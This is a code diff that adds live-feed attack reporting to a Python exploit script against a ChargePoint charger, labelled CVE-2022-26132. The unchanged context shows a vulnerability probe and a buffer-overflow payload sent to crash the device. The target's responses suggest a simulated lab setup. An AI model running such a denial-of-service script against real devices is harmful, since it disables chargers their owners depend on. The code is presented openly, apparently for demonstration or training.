@@ -20,15 +20,39 @@ import requests
 import sys
 import time
 
+# Import attack reporter for live feed
+try:
+    from attack_reporter import report_attack, report_step, report_success, report_failure, report_command, report_data
+    HAS_REPORTER = True
+except ImportError:
+    HAS_REPORTER = False
+    def report_attack(*args, **kwargs): pass
+    def report_step(*args, **kwargs): pass
+    def report_success(*args, **kwargs): pass
+    def report_failure(*args, **kwargs): pass
+    def report_command(*args, **kwargs): pass
+    def report_data(*args, **kwargs): pass
+
 
 class ChargePointExploit:
     def __init__(self, target: str, port: int):
         self.base_url = f"http://{target}:{port}"
+        self.target_str = f"{target}:{port}"
         self.buffer_size = 1024  # Known vulnerable buffer size
+        
+        # Report attack start
+        report_attack(
+            cve="CVE-2022-26132",
+            name="ChargePoint Home Flex DoS",
+            severity="high",
+            target=self.target_str,
+            attack_type="dos"
+        )
         
     def check_vulnerable(self) -> bool:
         """Check if target is vulnerable"""
         print(f"[*] Checking target: {self.base_url}")
+        report_step(f"Probing {self.base_url}/status for vulnerability")
         try:
             resp = requests.get(f"{self.base_url}/status", timeout=10)
             if resp.status_code == 200:
@@ -43,10 +67,12 @@ class ChargePointExploit:
                 if data.get('vulnerable_buffer_size'):
                     self.buffer_size = data.get('vulnerable_buffer_size')
                     print("[+] Target is VULNERABLE to CVE-2022-26132!")
+                    report_success(f"Target vulnerable - buffer size {self.buffer_size} bytes")
                     return True
             return False
         except requests.exceptions.RequestException as e:
             print(f"[-] Connection error: {e}")
+            report_failure(f"Connection failed: {e}")
             return False
     
     def trigger_overflow(self, payload_size: int = None) -> bool:
@@ -57,6 +83,7 @@ class ChargePointExploit:
             payload_size = self.buffer_size + 512  # Exceed buffer
         
         print(f"\n[*] Sending payload of {payload_size} bytes (buffer is {self.buffer_size})...")
+        report_step(f"Sending {payload_size} byte overflow payload", severity="critical")
         
         # Create overflow payload
         # Pattern: 'A' * size + potential return address overwrite
@@ -83,6 +110,7 @@ class ChargePointExploit:
                     print(f"    Buffer size: {data.get('buffer_size')}")
                     print(f"    Device status: {data.get('status')}")
                     print(f"    Total crash count: {data.get('crash_count')}")
+                    report_success(f"Buffer overflow triggered! Crash count: {data.get('crash_count')}")
                     return True
             
             print(f"[-] Unexpected response: {resp.status_code}")
@@ -90,9 +118,11 @@ class ChargePointExploit:
             
         except requests.exceptions.ReadTimeout:
             print("[+] Device crashed! (connection timeout)")
+            report_success("Device crashed - connection timeout (DoS successful)")
             return True
         except requests.exceptions.ConnectionError:
             print("[+] Device crashed! (connection refused)")
+            report_success("Device crashed - connection refused (DoS successful)")
             return True
         except Exception as e:
             print(f"[-] Error: {e}")
